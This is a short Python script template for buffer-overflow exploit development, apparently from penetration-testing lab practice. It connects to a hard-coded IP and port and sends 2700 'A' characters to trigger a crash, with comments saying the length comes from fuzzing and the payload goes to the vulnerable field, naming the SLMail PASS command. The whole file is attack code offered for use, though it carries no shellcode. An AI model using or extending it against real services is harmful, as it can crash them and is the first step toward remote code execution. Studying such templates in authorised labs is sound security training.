1 #!/usr/bin/env python  
import socket  
RHOST = "172.17.24.132"
RPORT = 31337 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((RHOST, RPORT)) 
lenFromFuzz = 2700 #get this from fuzzing
buf = ""
buf += "A"*lenFromFuzz  
buf += "\n"  
s.send(buf) #make sure to modify this so it actually reflects where the buffer overflow takes place.  For example the PASS field for slmail
